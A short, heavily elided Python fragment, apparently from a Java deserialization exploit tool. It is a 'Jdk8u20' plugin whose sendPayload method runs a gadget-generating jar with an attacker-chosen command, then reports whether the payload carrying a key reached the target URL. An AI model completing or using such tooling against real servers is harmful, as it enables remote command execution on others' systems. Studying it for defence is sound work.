...
@Idea.plugin_register('Class29:Jdk8u20')
class Jdk8u20(object):
    ...
    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'Jdk8u20', command],       #popen
        ...
        try:
            ...
            if(x.status_code==200):
                ...
                print("[+]   ****Jdk8u20模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
            else:
                print("[-]   ****Jdk8u20模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
